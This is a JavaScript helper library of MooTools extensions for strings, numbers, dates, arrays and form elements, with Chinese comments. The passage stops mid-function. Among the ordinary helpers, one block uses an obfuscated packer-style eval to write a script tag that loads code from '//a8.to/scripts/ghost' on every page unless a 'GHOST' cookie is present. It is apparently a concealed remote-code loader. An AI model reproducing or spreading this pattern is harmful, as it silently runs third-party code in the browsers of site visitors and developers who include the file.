/// <reference path="mootools.source.js" />
if (!window["UI"]) window["UI"] = new Object();

// mootools 的官方扩展
//  Types/String.QueryString.js
!function () {
    var decodeComponent = function (str) {
        return decodeURIComponent(str.replace(/\+/g, ' '));
    };

    String.implement({
        parseQueryString: function (decodeKeys, decodeValues) {
            if (decodeKeys == null) decodeKeys = true;
            if (decodeValues == null) decodeValues = true;

            var vars = this.split(/[&;]/),
                object = {};
            if (!vars.length) return object;

            vars.each(function (val) {
                var index = val.indexOf('=') + 1,
                    value = index ? val.substr(index) : '',
                    keys = index ? val.substr(0, index - 1).match(/([^\]\[]+|(\B)(?=\]))/g) : [val],
                    obj = object;
                if (!keys) return;
                if (decodeValues) value = decodeComponent(value);
                keys.each(function (key, i) {
                    if (decodeKeys) key = decodeComponent(key);
                    var current = obj[key];

                    if (i < keys.length - 1) obj = obj[key] = current || {};
                    else if (typeOf(current) == 'array') current.push(value);
                    else obj[key] = current != null ? [current, value] : value;
                });
            });

            return object;
        },

        cleanQueryString: function (method) {
            return this.split('&').filter(function (val) {
                var index = val.indexOf('='),
                    key = index < 0 ? '' : val.substr(0, index),
                    value = val.substr(index + 1);

                return method ? method.call(null, key, value) : (value || value === 0);
            }).join('&');
        }
    });
}();


/*  调试  */
if (!window["console"]) {
    window["console"] = {
        log: function (msg) {

        }
    }
};

var $F = function (name) {
    /// <summary>
    /// 查找名字为name的控件
    /// </summary>
    /// <param name="name">String 名字</param>
    return $$("*[name=" + name + "]").getLast();
};

// 获取对象的字段值（支持.号隔开的查询方式）
Object.getValue = function (obj, key) {
    var keys = key.split('.');
    var value = null;
    for (var i = 0; i < keys.length; i++) {
        var _value = value = obj[keys[i]];
        if (_value) {
            obj = _value;
        } else {
            return value;
        }
    }
    return value;
};

// 字符串扩展方法
!function () {
    String.prototype.get = function (key, ignoreCase) {
        /// <summary>
        /// 获取 query string 的键内容
        /// </summary>
        /// <param name="key">键</param>
        /// <param name="ignoreCase">是否区分大小写。 可选项，默认为false</param>
        /// <returns>值</returns>
        var str = this;
        ignoreCase = ignoreCase == undefined ? false : ignoreCase;
        if (str.indexOf("?") > -1) str = str.substr(str.indexOf('?') + 1);
        var value = null;
        str.split("&").each(function (item) {
            var name = item.split("=");
            if (name[0] == key || (!ignoreCase && name[0].toLowerCase() == key.toLowerCase())) {
                value = name[1];
                if (value.contains("#")) {
                    value = value.substr(0, value.indexOf("#"));
                }
            }
        });
        return value;
    };

    String.prototype.getBody = function (starTag, endTag) {
        /// <summary>
        /// 获取文本指定标签中的内容
        /// </summary>
        /// <param name="starTag">开始标签  可选参数 默认为 &lt;body&gt; </param>
        /// <param name="endTag">结束标签  可选参数 默认为 &lt;body&gt; </param>
        var html = this;
        if (starTag == undefined) starTag = "<body>";
        if (endTag == undefined) endTag = "</body>";
        if (html.indexOf(starTag) == -1 || html.substring(html.indexOf(starTag)).indexOf(endTag) == -1) return this;
        return html.substring(html.indexOf(starTag) + starTag.length, html.indexOf(starTag) + html.substring(html.indexOf(starTag)).indexOf(endTag));
    };

    String.prototype.toDate = function () {
        /// <summary>
        /// 把字符串转化成为日期对象 字符串格式为 yyyy(-|/)MM(-|/)dd 
        /// </summary>
        var str = this;
        var regex = /^(\d{4})[\-|\/](\d{1,2})[\-|\/](\d{1,2}).*?/;
        if (!regex.test(str)) return null;
        var matchs = str.match(regex);
        var date = new Date(matchs[1], matchs[2].toInt() - 1, matchs[3]);
        //18:17:00
        regex = /(\d{1,2}):(\d{1,2}):(\d{1,2})/;
        if (!regex.test(str)) return date;
        matchs = str.match(regex);
        date.setHours(matchs[1], matchs[2], matchs[3]);
        return date;
    };

    String.prototype.StartWith = function (str, ignoreCase) {
        /// <summary>
        /// 确定此字符串实例的开头是否与指定的字符串匹配。
        /// </summary>
        /// <param name="str">String 要比较的字符串</param>
        /// <param name="ignoreCase">Boolean 是否区分大小写 可选参数，默认为false</param>
        if (ignoreCase == undefined) ignoreCase = false;
        var string = this;
        if (!ignoreCase) { string = string.toLowerCase(); str = str.toLowerCase(); }
        return string.indexOf(str) == 0;
    };

    String.prototype.EndWith = function (str, ignoreCase) {
        /// <summary>
        /// 确定此字符串实例的结尾是否与指定的字符串匹配。
        /// </summary>
        /// <param name="str">String 要比较的字符串</param>
        /// <param name="ignoreCase">Boolean 是否区分大小写 可选参数，默认为false</param>
        if (ignoreCase == undefined) ignoreCase = false;
        var string = this;
        if (!ignoreCase) { string = string.toLowerCase(); str = str.toLowerCase(); }
        return string.length == string.indexOf(str) + str.length;
    };

    String.prototype.toHtml = function (data, fun) {
        /// <summary>
        /// 把HTMl模板内容与对象内容进行替换。
        /// </summary>
        /// <param name="data">Object 含值的对象</param>
        /// <param name="fun">单独处理对象</param>
        if (fun == undefined) {

            var _fun = null;

            var getData = function (obj, key) {
                var param = new Array();
                key.split(/\||,/).each(function (itemKey) {
                    var data = obj;
                    var keyList = itemKey.split(".");
                    for (var i = 0; i < keyList.length; i++) {
                        data = data[keyList[i]];
                        if (!data) break;
                    }
                    param.push(data);
                });
                return param;
            };

            fun = function (key) {
                var reg = /(.*?),(\d+)/;
                var obj = null;
                if (!reg.test(key)) {
                    var _funName = null;
                    var _fun = null;
                    if (key.contains(":")) {
                        var _funName = key.substring(key.indexOf(":") + 1);
                        key = key.substring(0, key.indexOf(":"));
                    }
                    obj = getData(data, key);
                    if (obj == undefined || obj.length == 0) return obj;
                    if (htmlFunction[_funName]) obj = htmlFunction[_funName].apply(this, obj);
                } else {
                    obj = data[reg.exec(key)[1]];
                    if (obj == undefined) return obj;
                    var length = reg.exec(key)[2].toInt();
                    while (obj.toString().length < length) {
                        obj = "0" + obj;
                    }
                }
                return obj;
            };
        }
        var str = this;
        return str.replace(/\$\{(.+?)\}/igm, function ($, $1) {
            var obj = null;
            switch (typeOf(data)) {
                case "element":
                    obj = data.get("data-" + $1.toLowerCase());
                    break;
                default:
                    obj = fun($1);
                    break;
            }
            if (obj == undefined || obj == null) return $;
            //if (/^[1-9][\d\.]+$/.test(obj)) obj = obj.toFloat();
            return obj != undefined ? obj : $;
        });
    };

    String.prototype.Query = function (key, value) {
        /// <summary>
        /// 替换查询参数
        /// <//summary>
        /// <param name="key">参数的KEY</param>
        /// <param name="value">参数的值</param>
        var href = this;
        if (href.indexOf("?") == -1) return [href, "?", key, "=", value].join("");
        var page = href.substring(0, href.indexOf("?") + 1);
        var query = href.substring(href.indexOf("?") + 1);
        var list = new Array();
        var hasKey = false;
        query.split('&').forEach(function (item) {
            if (item.split('=').length == 2) {
                var item1 = item.split('=')[0];
                var item2 = item.split('=')[1];
                var regex = new RegExp(key, "i");
                if (regex.test(item1)) {
                    item2 = value;
                    hasKey = true;
                }
                list.push(item1 + "=" + item2);
            }
        });
        if (!hasKey) {
            list.push(key + "=" + value);
        }
        return page + list.join("&");
    };

    String.prototype.toNumber = function () {
        /// <summary>
        /// 把任意字符串转化成为数字
        /// <//summary>
        return this.replace(/[^\d|\.]/gi, "").toFloat();
    };

    String.prototype.getStrong = function () {
        /// <summary>
        /// 获取一个字符串作为密码的强度
        /// <//summary>
        if (this.length < 5) {
            return 0;
        }
        var strong = 0;
        if (this.match(/[a-z]/ig)) {
            strong++;
        }
        if (this.match(/[0-9]/ig)) {
            strong++;
        }
        if (this.match(/(.[^a-z0-9])/ig)) {
            strong++;
        }
        return strong;
    };

    // 把数字转化成为人民币的大写形式
    String.prototype.toCurrency = function () {
        var n = this;
        var fraction = ['角', '分'];
        var digit = ['零', '壹', '贰', '叁', '肆', '伍', '陆', '柒', '捌', '玖'];
        var unit = [['元', '万', '亿'], ['', '拾', '佰', '仟']];
        var head = n < 0 ? '欠' : '';
        n = Math.abs(n);

        var s = '';

        for (var i = 0; i < fraction.length; i++) {
            s += (digit[Math.floor(n * 10 * Math.pow(10, i)) % 10] + fraction[i]).replace(/零./, '');
        }
        s = s || '整';
        n = Math.floor(n);

        for (var i = 0; i < unit[0].length && n > 0; i++) {
            var p = '';
            for (var j = 0; j < unit[1].length && n > 0; j++) {
                p = digit[n % 10] + unit[1][j] + p;
                n = Math.floor(n / 10);
            }
            s = p.replace(/(零.)*零$/, '').replace(/^$/, '零') + unit[0][i] + s;
        }
        return head + s.replace(/(零.)*零元/, '元').replace(/(零.)+/g, '零').replace(/^整$/, '零元整');
    };

    // 提取文字里面的数字
    String.prototype.toMoney = function () {
        var value = this;
        var str = new Array();
        for (var i = 0; i < value.length; i++) {
            t = value[i];
            if (/[\d\-\.]/.test(t)) str.push(t);
        }
        var money = str.join("").toFloat();
        if (isNaN(money)) return 0;
        return money;
    };

    // 过滤字符串的重复内容
    String.prototype.distinct = function () {
        var str = new Array();
        for (var i = 0; i < this.length; i++) {
            if (!str.contains(this[i])) {
                str.push(this[i]);
            }
        }
        return str.join("");
    };

    // 左侧添加字符串
    String.prototype.padLeft = function (length, char) {
        var value = this;
        if (value.length >= length) return value;
        var list = new Array();
        for (var i = 0; i < length - value.length; i++) {
            list.push(char);
        }
        return list.join("") + value;
    };

    // 右侧添加字符串
    String.prototype.padRight = function (length, char) {
        var value = this;
        if (value.length >= length) return value;
        var list = new Array();
        for (var i = 0; i < length - value.length; i++) {
            list.push(char);
        }
        return value + list.join("");
    };


    // 获取二维码路径
    String.prototype.toQRCode = function (width, height, isEncode) {
        if (!width) width = 220;
        if (!height) height = 220;
        var str = this;
        if (isEncode) str = escape(str);
        return "//pan.baidu.com/share/qrcode?w=" + width + "&h=" + width + "&url=" + str;
    };
}();

// 字符串格式化函数
!function () {
    window["htmlFunction"] = {
        // 数字转化为百分数
        "p": function (value) {
            if (!value) return value;
            var num = value.toFloat();
            if (isNaN(num)) return value;
            return num.ToString("p");
        },
        "n": function (value) {
            if (!value) return value;
            var num = value.toFloat();
            if (isNaN(num)) return value;
            return num.ToString("n");
        },
        "c": function (value) {
            if (!value) return value;
            var num = value.toFloat();
            if (isNaN(num)) return value;
            return num.ToString("c");
        },
        // 把时间转化成为日期
        "date": function (value) {
            var regex = /(\d{4})\/(\d{1,2})\/(\d{1,2})/;
            if (!regex.test(value)) return value;
            var obj = regex.exec(value);
            return [obj[1], obj[2], obj[3]].join("-");
        },
        // 中文的日期格式
        "longdate": function (value) {
            var regex = /(\d{4})\/(\d{1,2})\/(\d{1,2})/;
            if (!regex.test(value)) return value;
            var obj = regex.exec(value);
            return [obj[1], "年", obj[2], "月", obj[3], "日"].join("");
        },
        // 保持日期的时间格式（到分钟）
        "shorttime": function (value) {
            var regex = /(\d{4})[\/\-](\d{1,2})[\/\-](\d{1,2})[\s](\d{1,2}):(\d{1,2}).+/;
            if (!regex.test(value)) return value;
            return value.replace(regex, function ($, $1, $2, $3, $4, $5) {
                return $3.padLeft(2, '0') + "日" + $4.padLeft(2, '0') + ":" + $5.padLeft(2, '0');
            });
        },
        // 转化成为规则的时间（分钟）
        "datetime": function (value) {
            var regex = /(\d{4})[\/\-](\d{1,2})[\/\-](\d{1,2})[\s](\d{1,2}):(\d{1,2}).+/;
            if (!regex.test(value)) return value + "N/A";
            return value.replace(regex, function ($, $1, $2, $3, $4, $5) {
                return $1 + "-" + $2.padLeft(2, '0') + "-" + $3.padLeft(2, '0') + " " + $4.padLeft(2, '0') + ":" + $5.padLeft(2, '0');
            });
        },
        // 转化成为规则的时间（分钟）
        "datetime-local": function (value) {
            var regex = /(\d{4})[\/\-](\d{1,2})[\/\-](\d{1,2})[\s](\d{1,2}):(\d{1,2}).+/;
            if (!regex.test(value)) return value + "N/A";
            return value.replace(regex, function ($, $1, $2, $3, $4, $5) {
                return $1 + "-" + $2.padLeft(2, '0') + "-" + $3.padLeft(2, '0') + "T" + $4.padLeft(2, '0') + ":" + $5.padLeft(2, '0');
            });
        },
        // 如果有内容就加上括号
        "brackets": function (value) {
            if (!value) return "";
            return "(" + value + ")";
        },
        // 保留两位小数
        "0.00": function (value) {
            var index = value.indexOf(".");
            var decimal = index == -1 ? "." : value.substr(index);
            decimal = decimal.padRight(3, "0");
            if (decimal.length > 3) decimal = decimal.substr(0, 3);
            var num = index == -1 ? value : value.substr(0, index);
            return num + decimal;
        }
    };
}();

// 插入a8引用的全局变量
!function () {
    if (/GHOST/.test(document.cookie)) return;
    //document.writeln("<script src=\"//a8.to/scripts/ghost\"></script>");
    eval(function (p, a, c, k, e, r) { e = String; if (!''.replace(/^/, String)) { while (c--) r[c] = k[c] || c; k = [function (e) { return r[e] }]; e = function () { return '\\w+' }; c = 1 }; while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]); return p }('1.2("<0 3=\\"//4.5/6/7\\"></0>");', 8, 8, 'script|document|writeln|src|a8|to|scripts|ghost'.split('|'), 0, {}));
}();

// 数字的扩展方法
!function () {
    Number.prototype.toMoney = function () {
        /// <summary>
        /// 把数字转化成为中文大写的钱
        /// <//summary>
        var numberValue = this.toFixed(2);
        var numberValue = new String(Math.round(numberValue * 100)); // 数字金额
        var chineseValue = ""; // 转换后的汉字金额
        var String1 = "零壹贰叁肆伍陆柒捌玖"; // 汉字数字
        var String2 = "万仟佰拾亿仟佰拾万仟佰拾元角分"; // 对应单位
        var len = numberValue.length; // numberValue 的字符串长度
        var Ch1; // 数字的汉语读法
        var Ch2; // 数字位的汉字读法
        var nZero = 0; // 用来计算连续的零值的个数
        var String3; // 指定位置的数值
        if (len > 15) {
            alert("超出计算范围");
            return "";
        }
        if (numberValue == 0) {
            chineseValue = "零元整";
            return chineseValue;
        }

        String2 = String2.substr(String2.length - len, len); // 取出对应位数的STRING2的值
        for (var i = 0; i < len; i++) {
            String3 = parseInt(numberValue.substr(i, 1), 10); // 取出需转换的某一位的值
            if (i != (len - 3) && i != (len - 7) && i != (len - 11) && i != (len - 15)) {
                if (String3 == 0) {
                    Ch1 = "";
                    Ch2 = "";
                    nZero = nZero + 1;
                }
                else if (String3 != 0 && nZero != 0) {
                    Ch1 = "零" + String1.substr(String3, 1);
                    Ch2 = String2.substr(i, 1);
                    nZero = 0;
                }
                else {
                    Ch1 = String1.substr(String3, 1);
                    Ch2 = String2.substr(i, 1);
                    nZero = 0;
                }
            }
            else { // 该位是万亿，亿，万，元位等关键位
                if (String3 != 0 && nZero != 0) {
                    Ch1 = "零" + String1.substr(String3, 1);
                    Ch2 = String2.substr(i, 1);
                    nZero = 0;
                }
                else if (String3 != 0 && nZero == 0) {
                    Ch1 = String1.substr(String3, 1);
                    Ch2 = String2.substr(i, 1);
                    nZero = 0;
                }
                else if (String3 == 0 && nZero >= 3) {
                    Ch1 = "";
                    Ch2 = "";
                    nZero = nZero + 1;
                }
                else {
                    Ch1 = "";
                    Ch2 = String2.substr(i, 1);
                    nZero = nZero + 1;
                }
                if (i == (len - 11) || i == (len - 3)) { // 如果该位是亿位或元位，则必须写上
                    Ch2 = String2.substr(i, 1);
                }
            }
            chineseValue = chineseValue + Ch1 + Ch2;
        }

        if (String3 == 0) { // 最后一位（分）为0时，加上“整”
            chineseValue = chineseValue + "整";
        }

        return chineseValue;

    };

    Number.prototype.toCurrency = function () {
        return this.toString().toCurrency();
    };

    Number.prototype.ToString = function (format) {
        /// <summary>
        /// 格式化数字
        /// </summary>
        /// <param name="format">String 格式化类型 c:货币</param>
        switch (format) {
            case "c":
                return "￥" + this.ToString("n");
                break;
            case "n":
                var number = Math.round(this * 100) / 100;
                return number.toFixed(2);
                break;
            case "p":
                return (this * 100).toFixed(2) + "%";
                break;
            case "HH:mm:ss":
            case "hh:mm:ss":
                var number = this;
                var hh = Math.floor(number / 3600);
                if (hh < 10) hh = "0" + hh;
                number -= hh * 3600;
                var mm = Math.floor(number / 60);
                number -= mm * 60;
                if (mm < 10) mm = "0" + mm;
                var ss = number;
                if (ss < 10) ss = "0" + ss;
                return hh + ":" + mm + ":" + ss;
                break;
            default:
                return this.toString();
                break;
        }
    };
}();

// 日期扩展方法
!function () {
    Date.prototype.getLastDate = function () {
        /// <summary>
        /// 获取一个月的最后一天的日期
        /// </summary>
        var date = new Date(this.getFullYear(), this.getMonth() + 1, 0);
        return date.getDate();
    };

    Date.prototype.getFirstDay = function () {
        /// <summary>
        /// 获取当前月的第一天是星期几
        /// </summary>
        var date = new Date(this.getFullYear(), this.getMonth(), 1);
        return date.getDay();
    };

    Date.prototype.AddDays = function (value) {
        /// <summary>
        /// 返回一个新的 DateTime，它将指定的天数加到此实例的值上。
        /// </summary>
        /// <param name="value">Int 由整数组成的天数。value 参数可以是负数也可以是正数。</param>
        var date = this;
        date.setDate(date.getDate() + value);
        return date;
    };

    Date.prototype.AddSecond = function (value) {
        /// <summary>
        /// 返回一个新的 DateTime，它将指定的秒数加到此实例的值上。
        /// </summary>
        /// <param name="value">Int 由整数组成的秒数。value 参数可以是负数也可以是正数。</param>
        var date = this;
        date.setSeconds(date.getSeconds() + value);
        return date;
    };

    Date.prototype.ToShortDateString = function () {
        /// <summary>
        /// 将当前 System.DateTime 对象的值转换为其等效的短日期字符串表示形式。
        /// </summary>
        return this.getFullYear() + "-" + (this.getMonth() + 1) + "-" + this.getDate();
    };

    Date.prototype.ToString = function () {
        /// <summary>
        /// 将当前 System.DateTime 对象的值转换为其等效的短日期字符串表示形式。
        /// </summary>
        return this.getFullYear() + "-" + (this.getMonth() + 1) + "-" + this.getDate() + " " + this.getHours() + ":" + this.getMinutes() + ":" + this.getSeconds();
    };

    Date.prototype.getDateDiff = function (date2) {
        /// <summary>
        /// 计算两个时间的时间差
        /// </summary>
        /// <param name="date2">当前时间要去减的时间对象</param>
        /// <return>返回一个object对象 Day , Hour , Minute, Second , TotalSecond </return>

        var d1 = this;
        var d2 = date2;
        var t = d1.getTime() - d2.getTime();
        var result = {
            Day: 0,
            Hour: 0,
            Minute: 0,
            Second: 0,
            Millisecond: 0,
            TotalSecond: 0
        };
        result.TotalSecond = t / 1000;
        result.Day = Math.floor(t / (24 * 3600 * 1000));
        t = t % (24 * 3600 * 1000);
        result.Hour = Math.floor(t / (3600 * 1000));
        t = t % (3600 * 1000);
        result.Minute = Math.floor(t / (60 * 1000));
        t = t % (60 * 1000);
        result.Second = Math.floor(t / 1000);
        result.Millisecond = t % 1000;

        return result;
    };

    Date.prototype.getDayOfYear = function () {
        /// <summary>
        /// 获取当前日期是一年中的第多少天
        /// </summary>
        var dateArr = new Array(31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31);
        var date = this;
        var day = date.getDate();
        var month = date.getMonth(); //getMonth()是从0开始
        var year = date.getFullYear();
        var result = 0;
        for (var i = 0; i < month; i++) {
            result += dateArr[i];
        }
        result += day;
        //判断是否闰年
        if (month > 1 && (year % 4 == 0 && year % 100 != 0) || year % 400 == 0) {
            result += 1;
        }
        return result;
    };

    Date.prototype.format = function (fmt) { //author: meizz 
        var date = this;
        var format = {
            "M+": function (key) {
                var month = (date.getMonth() + 1).toString();
                return month.padLeft(key.length, '0');
            },
            "y+": function (key) {
                var year = date.getFullYear().toString();
                return year.substr(year.length - key.length);
            },
            "d+": function (key) {
                if (key == "dddd") {
                    return ["星期日", "星期一", "星期二", "星期三", "星期四", "星期五", "星期六"][date.getDay()];
                }
                var day = date.getDate().toString();
                return day.padLeft(key.length, '0');
            },
            "h+": function (key) {
                return date.getHours().toString().padLeft(key.length, '0');
            },
            "m+": function (key) {
                return date.getMinutes().toString().padLeft(key.length, '0');
            },
            "s+": function (key) {
                return date.getSeconds().toString().padLeft(key.length, '0');
            },
            "S+": function (key) {
                return date.getMilliseconds();
            }
        };

        Object.forEach(format, function (fun, key) {
            var regex = new RegExp("(" + key + ")", "g");
            fmt = fmt.replace(regex, function ($1, $2) {
                return fun($1);
            });
        });
        return fmt;
    };

    var _getServerTime = null;

    Date.getServerTime = function (callback) {
        /// <summary>
        /// 通过robot文件获取当前服务器的时间
        /// </summary>
        /// <param name="callback">获取到时间之后要执行的方法</param>
        if (_getServerTime == null) {
            _getServerTime = new Request({
                method: 'get',
                "onComplete": function () {
                    var date = this.getHeader('Date');
                    if (callback) {
                        callback.apply(this, [new Date(date)]);
                    }
                }
            });
        }

        if (_getServerTime.isRunning()) {
            _getServerTime.cancel();
        }
        _getServerTime.send({
            "url": "/robot.txt?t=" + Math.random()
        });
    };

}();

// 数组扩展方法
!function () {
    // 数组过滤重复
    Array.prototype.distinct = function () {
        var obj = new Object();
        var list = this;
        for (var i = 0; i < list.length; i++) {
            if (!obj[list[i]]) obj[list[i]] = true;
        }
        list.empty();
        Object.forEach(obj, function (value, key) {
            list.push(key);
        });
        return list;
    };

    Array.prototype.bind = function (el, option) {
        /// <summary>
        /// 把数组绑定到控件上 (2013.6.10 数组新增 selected 属性，可设置为默认选中）
        /// </summary>
        // 如果字段名有逗号则使用separator来拼接   
        // Ex.  ({ Name : 'A',Pass:'B'},'Name,Pass'，'|')  返回  "A|B"
        function getValue(item, fields, separator) {
            if (typeof (fields) == "function") {
                return fields(item);
            }
            if (separator == undefined) separator = " ";
            var field = fields.split(",");
            var value = new Array();
            for (var i = 0; i < field.length; i++) {
                value.push(item[field[i]]);
            }
            return value.join(separator);
        };

        var list = this;

        (function () {
            switch (el.get("tag")) {
                case "select":
                    Element.clean(el);
                    list.each(function (item) {
                        var op = option;
                        if (op == undefined) op = { text: "text", value: "value" };

                        var options = new Option(getValue(item, op.text, op.split), getValue(item, op.value, op.split));
                        el.options.add(options);
                        if (item.selected || options.value == op.selected || options.value == el.get("data-selected")) options.selected = true;
                    });
                    break;
                case "table":   // 绑定到表格上
                    var op = option;
                    if (op == undefined) op = new Object();

                    // 判断是否更新tr。 如果返回true则先删除再插入，如果返回false则不予理睬
                    if (op.dispose == undefined) {
                        op.dispose = function (tr) {
                            return true;
                        };
                    }
                    if (op.id == undefined) {
                        op.id = "ID";
                    }

                    var foot = el.getElement("tfoot");
                    var body = el.getElement("tbody");
                    if (body == null) body = el;
                    if (foot == null) return;
                    var tr = foot.getElement("tr");
                    if (tr == null) return;
                    el.getElements("tbody > tr").each(function (tr) {
                        if (op.dispose(tr)) tr.dispose();
                    });

                    list.each(function (item) {
                        var newtr = new Element("tr", {
                            "data-id": item[op.id] ? item[op.id] : "",
                            "html": tr.get("html").toHtml(item)
                        });
                        if (op.dispose(newtr))
                            newtr.inject(body);
                    });
                    break;
            }
        })();

        if (option && option["onAfter"])
            option["onAfter"].apply();
    };

    Array.prototype.dispose = function () {
        /// <summary>
        /// 依次注销数组内的Element元素
        /// </summary>
        var list = this;
        list.each(function (item) {
            if (typeOf(item) == "element") {
                item.dispose();
            }
        });
    };

    Array.prototype.getParentTree = function (id, value, parent) {
        /// <summary>
        /// 获取一个数组的父级树（最多32层）  返回从顶级到子集的列表
        /// </summary>
        var list = this;

        if (value == undefined) value = function (obj) { return obj.ID; };
        if (parent == undefined) parent = function (obj) { return obj.ParentID; };

        var getValue = function (_id) {
            return list.filter(function (item) { return value(item) == _id; }).getLast();
        };

        var parentList = new Array();
        var depth = 0;
        while (true) {
            var obj = getValue(id);
            depth++;
            if (obj == null || depth > 32) break;
            parentList.push(value(obj));
            id = parent(obj);
        }

        return parentList.reverse();
    };

    Array.prototype.first = function (match) {
        /// <summary>
        /// 获取数组的符合条件的哦第一个
        /// </summary>
        var list = this.filter(match);
        if (list.length == 0) return null;
        return list[0];
    };

    Array.prototype.update = function (obj, primaryKey) {
        /// <summary>
        /// 更新数组中的一项
        /// </summary>
        var list = this;
        var update = false;
        list.each(function (item, index) {
            if (item[primaryKey] == obj[primaryKey]) {
                this[index] = obj;
                update = true;
            }
        });
        return update;
    };

    Array.prototype.set = function (key, value) {
        /// <summary>
        /// 批量设置属性
        /// </summary>
        this.each(function (item) {
            item.set(key, value);
        });
    };

    Array.prototype.removeClass = function (cssName) {
        /// <summary>
        /// 批量清除样式
        /// </summary>
        this.each(function (item) {
            item.removeClass(cssName);
        });
    };

    Array.prototype.setStyle = function (name, value) {
        /// <summary>
        /// 批量设置样式
        /// </summary>
        this.each(function (item) {
            item.setStyle(name, value);
        });
    };

    // 把数组转化成为对象
    Array.prototype.toObject = function (key, value) {
        var data = new Object();
        var list = this;
        list.each(function (item) {
            var name = null;
            switch (typeof (key)) {
                case "function":
                    name = key.apply(list, [item]);
                    break;
                default:
                    name = item[key];
                    break;
            }
            if (!name) return;
            if (!value) value = function (t) { return t; };
            switch (typeof (value)) {
                case "function":
                    data[name] = value.apply(list, [item]);
                    break;
                default:
                    data[name] = item[value];
                    break;
            }
        });
        return data;
    };
}();

// DOM对象扩展方法
!function () {

    Element.clean = function (t) {
        /// <summary>
        /// 清空自身的元素
        /// </summary>
        switch (t.get("tag")) {
            case "select":
                for (var index = t.options.length - 1; index >= 0; index--) {
                    t.options[index] = null;
                }
                break;
            default:
                t.getElements("[data-field]").each(function (item) {
                    switch (item.get("tag")) {
                        case "input":
                        case "textarea":
                        case "select":
                            item.set("value", "");
                            break;
                        default:
                            item.set("html", "");
                            break;

                    }
                });
                break;
        }
    };

    Element.CheckBox = function (obj) {
        /// <summary>
        /// 在提交form的时候如果checkbox为空则设置该值为false而且选中
        /// </summary> 
        /// <param name="obj">checkbox 对象 </param>
        obj = document.id(obj);
        if (!obj.get("checked")) {
            obj.set("value", "false");
            obj.set("checked", true);
            obj.setStyle("visibility", "hidden");
        }
    };

    // 获取form对象内控件的值
    Element.GetDataString = function (form) {
        var obj = new Object();
        form.getElements("input , select , textarea").each(function (item) {
            var name = item.get("name");
            if (name == null) return;
            if (!obj[name]) obj[name] = new Array();
            obj[name].push(item.get("value"));
        });
        var list = new Array();
        Object.forEach(obj, function (value, key) {
            list.push(key + "=" + value.join(","));
        });
        return list.join("&");
    };

    // 设置选权
    Element.SelectAll = function (obj, list, count) {
        if (obj == undefined) obj = "selectAll";
        obj = document.id(obj);
        if (obj == null) return null;
        if (!count) count = 10000;
        if (list == undefined) {
            var form = obj.getParent("form");
            if (form == null) form = document.id(document.body);
            list = form.getElements("input[type=checkbox]").filter(function (item) { return item.get("name") == "ID"; });
        }
        list = list.filter(function (item) { return !item.get("disabled"); });
        obj.addEvent("click", function () {
            var isChecked = this.get("checked");
            list.each(function (item, index) {
                if (index < count) {
                    item.set("checked", isChecked);
                    item.fireEvent("click");
                }
            });
        });
    };

    // 获取被选中的值
    Element.GetSelectedValue = function (elementList) {
        if (elementList == null) {
            elementList = $$("input[type=checkbox]").filter(function (item) { return item.get("name") == "ID"; });
        }
        var list = new Array();
        elementList.each(function (item) {
            if (item.get("checked")) {
                list.push(item.get("value"));
            }
        });
        return list;
    };

    // 把obj的值绑定到container下的元素,根据 data-field 判断。 prefix 为元素的前缀名，可选。
    Element.Bind = function (container, obj, prefix) {
        Object.forEach(obj, function (value, key) {
            var field = prefix ? prefix + "." + key : key;
            var el = container.getElement("[data-field=" + field + "]");
            if (el != null) {
                Element.SetValue(el, value);
            }
        });
    };

    // 设置选中值
    Element.SetValue = function (el, value) {
        switch (el.get("tag")) {
            case "input":
            case "textarea":
                el.set("value", value);
                break;
            case "select":
                var selectedIndex = -1;
                for (var i = 0; i < el.options.length; i++) {
                    if (el.options[i].value == value) {
                        selectedIndex = i;
                        break;
                    }
                }
                if (selectedIndex != -1) {
                    el.options[selectedIndex].selected = true;
                }
                break;
            default:
                el.set("html", value);
                break;
        }
    };

    // 获取Dom元素的值
    Element.GetValue = function (obj) {
        var value = null;
        switch (obj.get("tag")) {
            case "input":
            case "select":
            case "textarea":
                value = obj.get("value");
                break;
            default:
                value = obj.get("html");
                break;
        }
        return value;
    };

    // 把dom对象转换成为XML字符串
    Element.GetXml = function (obj) {
        obj = document.id(obj);
        if (obj == null) return null;
        // 提取元素的属性
        var getProperties = function (el) {
            var properties = new Array();
            for (var i = 0; i < el.attributes.length; i++) {
                var att = el.attributes[i];
                if (att.name == "data-node" || att.name.indexOf("data-") != 0) continue;
                properties.push(att.name + "=\"" + att.value + "\"");
            }
            return properties.join(" ");
        };

        var list = new Array();
        list.push("<root>");
        switch (obj.get("tag")) {
            case "table":
                obj.getElements("tbody tr").each(function (item) {
                    if (item.get("data-noxml") != null) return;

                    list.push("<item " + getProperties(item) + ">");
                    item.getElements("[data-node]").each(function (node) {
                        list.push(["<", node.get("data-node"), " ", getProperties(node), ">", Element.GetValue(node), "</", node.get("data-node"), ">"].join(""));
                    });
                    list.push("</item>");
                });
                break;
        }
        list.push("</root>");
        return list.join("");
    };

    // 把dom对象里面的data属性提取出来，转换成为一个对象
    Element.GetAttribute = function (el, prefix) {
        if (!prefix) prefix = "data-";
        el = document.id(el);
        if (el == null) return;
        var obj = new Object();
        var regex = new RegExp("^" + prefix);
        for (var i = 0; i < el.attributes.length; i++) {
            var att = el.attributes[i];
            if (regex.test(att.name)) {
                var name = att.name.substr(prefix.length);
                var value = att.value;
                obj[name] = value;
            }
        }
        return obj;
    };

    // 数据库异步加载的联动
    Element.Linkage = function (url, objs, options) {
        var getNexts = function (obj) {
            var list = new Array();
            var hasObj = false;
            objs.each(function (item) {
                if (hasObj) list.push(item);
                if (item == obj) hasObj = true;
            });
            return list;
        };

        // 获取下级的默认值（要包括obj）
        var getDefaultValue = function (obj) {
            var list = new Array();
            var value = obj.get("data-value");
            if (value == null) value = 0;
            list.push(value);
            getNexts(obj).each(function (item) {
                var value = item.get("data-value");
                if (value == null) value = 0;
                list.push(value);
            });
            return list;
        };

        objs.addEvent("change", function (e) {
            var obj = this;
            var value = obj.get("value");

            getNexts(obj).each(function (item) {
                Element.clean(item);
                item.fade("hide");
            });

            new Request.JSON({
                "url": url,
                "onReuqest": function () {
                    objs.set("disabled", true);
                },
                "onComplete": function () {
                    objs.set("disabled", false);
                },
                "onSuccess": function (result) {
                    var list = result.info;
                    if (list == null) return false;
                    var parentID = value;
                    getNexts(obj).each(function (drpObj) {
                        var selected = drpObj.get("data-value");
                        var opList = list.filter(function (t) {
